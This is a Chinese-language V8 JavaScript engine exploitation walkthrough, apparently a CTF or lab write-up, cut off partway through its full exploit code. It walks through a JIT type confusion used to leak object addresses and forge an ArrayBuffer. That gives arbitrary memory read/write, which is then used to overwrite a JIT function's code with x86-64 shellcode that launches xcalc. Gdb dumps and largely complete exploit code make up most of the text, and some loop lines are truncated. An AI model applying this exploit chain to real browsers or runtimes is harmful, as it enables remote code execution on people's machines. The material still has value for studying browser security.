        function evil_r2() {
            arr2[0] = object;
        }
        for (var i = 0; i  {
             0-2: 4.3818e-311
               3: 3.47668e-310
             4-5: 3.4771e-308
     }
    810f1c96e99
    ...
    ...
    gdb-peda$ x/20gx 0x810f1c96e89-1
    0x810f1c96e88:  0x0000361a14882de1-->fixedArray真正的map   0x0000000600000000-->fixedArray的length
    下面才是我们fake的ArrayBuffer
    ...
    ...
    0x810f1c96e98:  0x00000810f1c94a01-->fake map   0x00000810f1c94a01-->随便
    0x810f1c96ea8:  0x00000810f1c94a01-->随便 0x0000400000000000-->length
    0x810f1c96eb8:  0x001900c60f00000a-->backingstore   0x001900c60f00000a-->随便
    0x810f1c96ec8:  0x0000361a14882201  0x0006913800000000
    ...
    0x810f1c96e89+0x10-0x810f1c96e29=0x70
### 将我们fake的ArrayBuffer当成一个JSObject读出来
我们可以在callback里改掉array的类型，比如将一个double array改成了object array，但是由于type
confusion，我们在第二次对arr[0]重新写入值的时候，依然把arr当成一个double array，并将其写入。  
这样实际上，我们把一个double的数值当成一个object指针写入。
如下，写入之后，arrr[0]将由于我们fake的arraybuffer的map，被视作一个arraybuffer对待，于是可以用它来初始化一个DataView。
DataView就可以操作这个fake的ArrayBuffer的BackingStore地址对应的内存。
    arrr=[1.1,2.2,3.3,4.4];
    function write_obj_addr(object){
        function evil_w0() {
            arrr[0] = {};
        }
        for (var i = 0; i  [HOLEY_ELEMENTS]
     - initial_map = 
     - shared_info = 0x2e1993f3ceb9 
     - name = 0x21df6cd02441 
     - formal_parameter_count = 0
     - kind = [ NormalFunction ]
     - context = 0x2e1993f03d91 
     - code = 0x19d27c522f01 
    ...
    ...
    gdb-peda$ x/20gx 0xac9a5c986c9-1
    0xac9a5c986c8:  0x00003a6b959824d1  0x000021df6cd02251
    0xac9a5c986d8:  0x000021df6cd02251  0x000021df6cd02321
    0xac9a5c986e8:  0x00002e1993f3ceb9  0x00002e1993f03d91
    0xac9a5c986f8:  0x00002e1993f3d091  0x000019d27c522f01-->code
从图中可以看出来，就是function-1（这个减一是因为v8中指针末位都置为1，需要去掉）+0x38，我们把它leak出来。
    gc();
    gc();
    var evil_f = new Function("var a = 1000000");
    gc();
    gc();
    print("要read的function");
    %DebugPrint(evil_f);
    arr3=[1.1,2.2,3.3,4.4];
    function read_obj_addr3(object){
        function evil_r3() {
            arr3[0] = object;
            %DebugPrint(arr3);
        }
        for (var i = 0; i 从这开始     0  488b5f2f       REX.W movq rbx,[rdi+0x2f]
    0x19d27c522f64     4  488b5b07       REX.W movq rbx,[rbx+0x7]
    0x19d27c522f68     8  488b4b0f       REX.W movq rcx,[rbx+0xf]
    0x19d27c522f6c     c  f6c101         testb rcx,0x1
    0x19d27c522f6f     f  0f8512020000   jnz 0x19d27c523187  (InterpreterEntryTrampoline)
    0x19d27c522f75    15  f6c101         testb rcx,0x1
    0x19d27c522f78    18  7410           jz 0x19d27c522f8a  (InterpreterEntryTrampoline)
    0x19d27c522f7a    1a  48ba000000003d000000 REX.W movq rdx,0x3d00000000
    0x19d27c522f84    24  e857350200     call 0x19d27c5464e0  (Abort)    ;; code: BUILTIN
    0x19d27c522f89    29  cc             int3l
    0x19d27c522f8a    2a  4885c9         REX.W testq rcx,rcx
    0x19d27c522f8d    2d  0f842c030000   jz 0x19d27c5232bf  (InterpreterEntryTrampoline)
    0x19d27c522f93    33  f6c101         testb rcx,0x1
    0x19d27c522f96    36  7410           jz 0x19d27c522fa8  (InterpreterEntryTrampoline)
    0x19d27c522f98    38  48ba000000003d000000 REX.W movq rdx,0x3d00000000
于是我们还要再加上0x5f
    shellcode_address=shellcode_address+new Int64(0x5f).asDouble();
    print(Int64.fromDouble(shellcode_address).toString(16));
### 向函数要执行的代码的地址，写入我们的shellcode
同上，将函数要执行的代码的地址写入到BackingStore，并用dataview向这个地址写入shellcode。
    fake_ab[4]=shellcode_address;
    fake_ab[5]=shellcode_address;
    %DebugPrint(fake_ab);
    // while(1);
    var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
    for(var i = 0; i 当某些地址在V8上泄露时，通常在大多数情况下被迫将其解释为双精度值，为了正确计算偏移量等，需要将其转换为整数值。
对于完成该转换，ArrayBuffer是最佳的**
      * ③从ArrayBuffer读取两个Uint32  
var t32 = new Uint32Array(ab);  
k = [t32[1],t32[0]]  
**\-- >k是6.953328187651540e-310,将字节序列按照4个字节去分开，然后解释为Uint32,于是得到:**  
**k=[0x00007fff，0xdeadbeef]**
#### JSArrayBuffer
  * 持有ArrayBuffer的对象
    * 继承Object，HeapObject，JSReceiver，JSObject
      * 内存结构如下（在64位环境的情况下）  
  * 实际演示
    * 存放TypedArray
    * 使用长度0x13370搜索ArrayBuffer的内存位置  
    * 在V8中，对象通常被存放在由GC管理的mapped区域，然而BackingStore是一个不被GC管理的区域，并且被存放在heap中(在图中，可以看到malloc块有prev_size和size成员）  
此外，由于它不是由GC管理的HeapObject，因此指向BackingStore的指针不是Tagged Value（末尾不能为1）  
    * 虽然在ArrayBuffer中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出BackingStore数组的范围。
    * **同样，如果您可以重写BackingStore指针，则可以读取和写入任意内存地址，这些是在exploit中常用的方法。**  
### 完整exp
我写了两个版本的exp，思路一样，但是写法稍微有点不同，版本一相对简洁舒服一些，版本二感觉会稳定一点。
#### 版本1
    function gc(){
        for(var i=0;i<1024 * 1024 *16;i++){
            new String;
        }
    }
    function d2u(num1,num2){
        d = new Uint32Array(2);
        d[0] = num2;
        d[1] = num1;
        f = new Float64Array(d.buffer);
        return f[0];
    }
    function u2d(num){
        f = new Float64Array(1);
        f[0] = num;
        d = new Uint32Array(f.buffer);
        return d[1] * 0x100000000 + d[0];
    }
    function change_to_float(intarr,floatarr){
        var j = 0;
        for(var i = 0;i < intarr.length;i = i+2){
            var re = d2u(intarr[i+1],intarr[i]);
            floatarr[j] = re;
            j++;
        }
    }
    // leak出object的地址，即将一个object当成double读出来
    function trigger(arr,callback){
        var v=arr[0];
        callback();
        return arr[0];
    }
    // 将一个数当成object写进去
    function trigger2(arr, callback, val) {
        var v = arr[0];
        callback();
        arr[0] = val;
    }
    var nop = 0xdaba0000;
    // 伪造ArrayBuffer的map
    var ab_map_obj = [
        nop,nop,
        0x0f00000a,0x001900c6,0x082003ff,0x0,
        nop,nop,   // use ut32.prototype replace it
        nop,nop,0x0,0x0
    ]
    var ab = new ArrayBuffer(0x20);
    arr0=[1.1,2.2,3.3,4.4];
    // leak arraybuffer的prototype和constructor
    function read_obj_addr(object){
        function evil_r0() {
            arr0[0] = object;
        }
        for (var i = 0; i < 100000; i++) {
            trigger(arr0, function() {})
        }
        re=u2d(trigger(arr0,evil_r0));
        return re;
    }
    ab_proto_addr=read_obj_addr(ab.__proto__);
    print("要被leak的ArrayBuffer");
    %DebugPrint(ab);
    print(ab_proto_addr.toString(16));
    ab_constructor_addr = ab_proto_addr - 0x1b0;
    print(ab_constructor_addr.toString(16));
    //用ab_proto_addr和ab_constructor_addr替换fake map中的nop
    ab_map_obj[0x6] = ab_proto_addr & 0xffffffff;
    ab_map_obj[0x7] = ab_proto_addr / 0x100000000;
    ab_map_obj[0x8] = ab_constructor_addr & 0xffffffff;
    ab_map_obj[0x9] = ab_constructor_addr / 0x100000000;
    var ab_map_obj_float = [1.1,1.1,1.1,1.1,1.1,1.1];
    // 将int array转换成double array
    change_to_float(ab_map_obj,ab_map_obj_float);
    // 此处gc是为了将ab_map_obj_float放入到old space里，
    // 如果没有gc则ab_map_obj_float会在后续的leak中由于gc而被迁移
    gc();
    // gc();
    print("要leak出的ab_map_obj_float的数组");
    %DebugPrint(ab_map_obj_float);
    // leak ab_map_obj_float的地址
    arr1=[1.1,2.2,3.3,4.4];
    function read_obj_addr1(object){
        function evil_r1() {
            arr1[0] = object;